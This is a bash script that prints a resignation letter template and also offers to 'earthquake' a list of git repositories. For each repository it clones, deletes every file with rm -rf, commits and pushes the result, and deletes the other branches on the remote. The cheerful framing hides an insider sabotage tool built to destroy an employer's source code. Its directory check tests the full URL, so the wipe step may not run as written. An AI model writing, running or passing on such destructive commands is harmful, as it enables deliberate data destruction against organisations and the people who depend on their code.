#!/bin/bash

echo "Insert your name:"
read name

echo "Insert your company name:"
read company

echo "Insert your job title:"
read job_title

echo "Insert your last day of work:"
read last_day

echo "Optional: insert the repositories you want to delete: (eg.: url_repo0.git url_repo1.git url_repo2.git):"
read -a REPOLIST

if [[ -z $REPOLIST ]]; then
    echo "No earthquake this time. But you still have your resignation letter if needed :)"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
fi
 
for repo in ${REPOLIST[@]}; do
    git clone $repo
    
    if [[ $? == 0  ]] && [[ -d ${repo} ]]; then
        echo "Starting earthquake on $repo"
        cd $repo
        git checkout -b earthquake
        rm -rf ./*
        git add -A && git commit -m 'earthquake.sh' && git push origin earthquake
        BRANCHES=$(git branch | grep -v \*)
        for branch in ${BRANCHES[@]}; do
            git branch -d $branch
            git push origin :$branch
        done
    else
        echo "Operation failed for $repo"
    fi
done


cat <<EOF
Dear ${company},

I am writing to formally inform you of my resignation from my position as ${job_title} at
${company}. In accordance with the period of notice agreed within my contract, my last
day will be ${last_day}.

I would like to take this opportunity to thank you for all of the opportunities presented to me
within the period of my employment. I have enjoyed my time working at $company,
however, in the best interests of my career, I feel that the time is right to move on.
Finally, if there is anything I can do to ensure a smooth and efficient handover process, please
do not hesitate to let me know.

I wish you all the very best for the future.
Thank you.

Yours sincerely,
${name}
EOF
